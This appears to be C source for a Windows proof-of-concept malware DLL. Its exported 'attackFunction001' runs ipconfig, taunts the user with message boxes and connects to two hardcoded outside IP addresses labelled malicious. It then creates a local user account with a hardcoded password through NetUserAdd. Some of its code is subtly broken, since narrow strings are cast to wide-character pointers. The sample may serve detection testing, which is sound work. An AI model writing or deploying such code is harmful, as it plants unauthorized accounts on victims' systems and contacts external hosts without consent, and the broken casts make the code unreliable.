#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <lm.h>

#pragma comment(lib, "ws2_32.lib")

char sz_Message[256] = "PoC001";

typedef NET_API_STATUS (NET_API_FUNCTION *LPNETUSERADD)(
  LPCWSTR   servername,
  DWORD     level,
  LPBYTE    buf,
  LPDWORD   parm_err
);

void connectToIP(const char* ip) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct sockaddr_in clientService;

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        MessageBoxA(0, "WSAStartup failed", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        MessageBoxA(0, "Error creating socket", "Error", MB_OK | MB_ICONERROR);
        WSACleanup();
        return;
    }

    memset(&clientService, 0, sizeof(clientService));
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr(ip);
    clientService.sin_port = htons(80); 

    if (connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
        MessageBoxA(0, "Unable to connect to server", "Error", MB_OK | MB_ICONERROR);
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }

    MessageBoxA(0, "Connected to server successfully", "Success", MB_OK);
    closesocket(ConnectSocket);
    WSACleanup();
}

void createUserAccount(const char* username, const char* password) {
    HMODULE hNetApi32 = LoadLibraryA("netapi32.dll");
    if (hNetApi32 == NULL) {
        MessageBoxA(0, "Failed to load netapi32.dll", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    LPNETUSERADD NetUserAdd = (LPNETUSERADD)GetProcAddress(hNetApi32, "NetUserAdd");
    if (NetUserAdd == NULL) {
        MessageBoxA(0, "Failed to get address of NetUserAdd function", "Error", MB_OK | MB_ICONERROR);
        FreeLibrary(hNetApi32);
        return;
    }

    USER_INFO_1 ui;
    DWORD dwLevel = 1;
    DWORD dwError = 0;
    NET_API_STATUS nStatus;

    ui.usri1_name = (LPWSTR)username;
    ui.usri1_password = (LPWSTR)password;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT;

    nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);

    if (nStatus == NERR_Success)
        MessageBoxA(0, "User account created successfully", "Success", MB_OK);
    else
        MessageBoxA(0, ">_<! Failed to create user account", "Error", MB_OK | MB_ICONERROR);

    FreeLibrary(hNetApi32);
}

__declspec(dllexport) void attackFunction001() {
    system("cmd /c ipconfig > ipconfig_output.txt");
    char buffer[1024];
    FILE *file = fopen("ipconfig_output.txt", "r");
    if (file != NULL) {
        while (fgets(buffer, sizeof(buffer), file) != NULL) {
            if (strstr(buffer, "IPv4 Address") != NULL) {
                MessageBoxA(0, "I find your ip now HaHaHa", "attackFunction001", 0);
                MessageBoxA(0, buffer, "Your IP Address", 0);
                MessageBoxA(0, buffer, "Connect Malicious IP...", 0);
                connectToIP("168.95.98.254");
                connectToIP("65.61.137.117");
                
                createUserAccount("PoC001", "Abc61619");
                break;
            }
        }
        fclose(file);
    } else {
        MessageBoxA(0, "Failed to execute ipconfig. >_< check the code", "Error", MB_OK | MB_ICONERROR);
    }
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {
    if ( fdwReason == DLL_PROCESS_ATTACH )
        strcpy(sz_Message, "PoC001 Testing...");
    return TRUE;
}
